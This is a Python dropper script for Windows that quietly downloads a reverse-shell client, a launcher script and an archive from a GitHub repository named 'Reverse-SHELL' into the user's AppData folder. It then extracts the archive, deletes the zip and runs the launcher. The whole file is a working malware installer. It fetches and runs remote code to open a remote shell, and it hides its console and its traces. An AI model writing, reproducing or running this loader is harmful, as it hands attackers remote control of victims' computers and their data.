import os, sys, subprocess

username = os.environ.get('USERNAME')
path = os.environ['appdata']
bat_path = path + '\\main.ps1'
file_path = path + '\\client.pyw'
src_path = path + '\\src'
script_path = src_path + '\\Script'

################################################ setup #################################################################
def setup():
    # download client.py file
    subprocess.call(
        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile "{file_path}"',
        shell=True)
    # download main.ps1 file
    subprocess.call(
        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.bat" -outfile "{bat_path}"',
        shell=True)
    # download src.zip file
    subprocess.call(f'powershell invoke-webrequest -uri "https://github.com/SmartBoyMuzaffar/Reverse-SHELL/raw/master/src.zip" -outfile "{path}\\src.zip"',
                    shell=True)
    # extract src.zip file
    subprocess.call(f'powershell.exe tar -xf {path}\\src.zip -C {path}',
                    shell=True)
    # delete src.zip file
    subprocess.call(f'powershell.exe rm {path}\\src.zip',
                    shell=True)
    # run client.py file
    subprocess.call(f'{bat_path}',
                    shell=True)
################################################ done ##################################################################
# Running code ...
if __name__ == '__main__':
    setup()
